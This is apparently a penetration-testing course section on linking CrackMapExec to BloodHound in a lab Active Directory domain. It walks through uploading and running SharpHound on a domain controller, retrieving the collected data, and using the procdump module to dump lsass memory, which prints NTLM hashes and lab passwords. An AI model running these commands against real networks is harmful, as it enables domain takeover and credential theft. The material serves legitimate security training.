# Bloodhound Integration

[BloodHound](https://github.com/BloodHoundAD/BloodHound) is an open-source tool used by attackers and defenders alike to analyze domain security. The tool takes in a large amount of data gathered from the domain. It uses graph theory to visually represent the relationship and identify domain attack paths that would have been difficult or impossible to detect with traditional enumeration.

In this section, we assume you are familiar with Bloodhound. If that's not the case, you can learn more about Bloodhound in the [Active Directory Bloodhound](https://academy.hackthebox.com/module/details/69/) module, or you can check [Bloodhound official documentation](https://bloodhound.readthedocs.io/en/latest/index.html).

***

## Bloodhound Mark as Owned

In [BloodHound](https://github.com/BloodHoundAD/BloodHound), we can manually mark a node (user, group, computer, etc.) as `owned` by right-clicking it and clicking `Mark X as Owned` meaning that we compromise it. This is helpful to keep track of the users and computers we compromised when working with a large organization and if we want to perform a BloodHound cypher query such as `Shortest Path from Owned Principals` or `Shortest Paths to Domain Admins from Owned Principals`.

We can configure CrackMapExec to mark any user or computer we compromise as owned in the BloodHound database. To do this, we need to modify the CrackMapExec configuration file located in `~/.cme/cme.conf` with the following options:

* Set the Bloodhound configuration option `bh_enabled` to True.
* Set the `bh_uri` to our Bloodhound database IP address.
* Set the `bh_port` to the database port.
* Set the credentials to match the bloodhound database are username `neo4j` and the password `HackTheBoxCME!` (Make sure to use the one that corresponds to your database).

The configuration should look as follow:

### **Configuring BloodHound Database**

```shell-session
$ cat ~/.cme/cme.conf

[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode = 

[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = HackTheBoxCME!

<SNIP>
```

{% hint style="info" %}
**Note:** Make sure to use the corresponding username and password to the BloodHound database you are connecting to.
{% endhint %}

***

## Collecting Bloodhound Data

To collect BloodHound data, we will use CrackMapExec to execute SharpHound and then transfer the file to our attack host.

### **Collecting BloodHound data**

```shell-session
al1abb@htb[/htb]$ wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -q
al1abb@htb[/htb]$ crackmapexec smb 10.129.203.121 -u julio -p Password1 --put-file SharpHound.exe SharpHound.exe

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB         10.129.203.121  445    DC01             [*] Copy SharpHound.exe to SharpHound.exe
SMB         10.129.203.121  445    DC01             [+] Created file SharpHound.exe on \\C$\SharpHound.exe
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip"

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB         10.129.203.121  445    DC01             [+] Executed command 
SMB         10.129.203.121  445    DC01             Volume in drive C has no label.
SMB         10.129.203.121  445    DC01             Volume Serial Number is B8B3-0D72
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             Directory of c:\
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             11/09/2022  09:54 AM            14,287 20221109095424_BloodHound.zip
SMB         10.129.203.121  445    DC01             1 File(s)         14,287 bytes
SMB         10.129.203.121  445    DC01             0 Dir(s)   8,828,305,408 bytes free
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 --get-file 20221109095424_BloodHound.zip bloodhound.zip

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB         10.129.203.121  445    DC01             [*] Copy 20221109095424_BloodHound.zip to bloodhound.zip
SMB         10.129.203.121  445    DC01             [+] File 20221109095424_BloodHound.zip was transferred to bloodhound.zip
```

Now we need to open BloodHound and import the data.

***

## Setting Users as Owned in BloodHound

Once the data is imported, if we try to connect with the user `robert`, it will set the user as owned in the BloodHound database.

### **User Added as Owned in BloodHound**

```shell-session
$ crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             Node ROBERT@INLANEFREIGHT.HTB successfully set as owned in BloodHound
```

The same will happen if we compromise a machine with multiple users. It will set all new users found as owned.

### **Adding Users as Owned with the Procdump Module**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M procdump

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB         10.129.203.121  445    DC01             Node JULIO@INLANEFREIGHT.HTB successfully set as owned in BloodHound
PROCDUMP    10.129.203.121  445    DC01             [*] Copy /tmp/shared/procdump.exe to C:\Windows\Temp\
PROCDUMP    10.129.203.121  445    DC01             [+] Created file procdump.exe on the \\C$\Windows\Temp\
PROCDUMP    10.129.203.121  445    DC01             [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP    10.129.203.121  445    DC01             [*] Executing command C:\Windows\Temp\procdump.exe -accepteula -ma 640 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP    10.129.203.121  445    DC01             [+] Process lsass.exe was successfully dumped
PROCDUMP    10.129.203.121  445    DC01             [*] Copy DC01-AMD64-INLANEFREIGHT.dmp to host
PROCDUMP    10.129.203.121  445    DC01             [+] Dumpfile of lsass.exe was transferred to /tmp/shared/DC01-AMD64-INLANEFREIGHT.dmp
PROCDUMP    10.129.203.121  445    DC01             [+] Deleted procdump file on the C$ share
PROCDUMP    10.129.203.121  445    DC01             [+] Deleted lsass.dmp file on the C$ share
PROCDUMP    10.129.203.121  445    DC01             127.0.0.1\julio:Password1
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\svc_mssql:842bfb5892fc6cbe2af323e3199f0f18
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP    10.129.203.121  445    DC01             127.0.0.1\julio:Password1
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP    10.129.203.121  445    DC01             127.0.0.1\julio:Password1
PROCDUMP    10.129.203.121  445    DC01             127.0.0.1\julio:Password1
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP    10.129.203.121  445    DC01             \julio:500aad7ceb637a4255d101d50045310b31729ddb
PROCDUMP    10.129.203.121  445    DC01             127.0.0.1\julio:Password1
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP    10.129.203.121  445    DC01             INLANEFREIGHT\svc_workstations:7247e8d4387e76996ff3f18a34316fdd
PROCDUMP    10.129.203.121  445    DC01             Node SVC_MSSQL@INLANEFREIGHT.HTB successfully set as owned in BloodHound
PROCDUMP    10.129.203.121  445    DC01             Node DAVID@INLANEFREIGHT.HTB successfully set as owned in BloodHound
PROCDUMP    10.129.203.121  445    DC01             Node SVC_WORKSTATIONS@INLANEFREIGHT.HTB successfully set as owned in BloodHound
```

{% hint style="info" %}
**Note:** Not all CrackMapExec options will sync with the BloodHound database. For example, if we try `--ntds` or `--lsa` options, it won't mark users as owned in the database, but modules such as `procdump` or `lsassy` will mark users as owned.
{% endhint %}

***

## Setting Computers as Owned in BloodHound

At the time of writing, BloodHound integration only marks users as Owned. If we want to mark a computer as owned, we can use the module `bh_owned` and the username and password of our neo4j database. In the following example, we will only add the `PASS` option, as the other default values match with our neo4j database.

```shell-session
$ crackmapexec smb -M bh_owned --options

[*] bh_owned module options:  

            URI            URI for Neo4j database (default: 127.0.0.1)
            PORT           Listening port for Neo4j database (default: 7687)
            USER           Username for Neo4j database (default: 'neo4j')
            PASS           Password for Neo4j database (default: 'neo4j')
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M bh_owned -o PASS=HackTheBoxCME!                                                                        
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)         
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)                                                               
BH_OWNED    10.129.203.121  445    DC01             [+] Node DC01.INLANEFREIGHT.HTB successfully set as owned in BloodHound
```
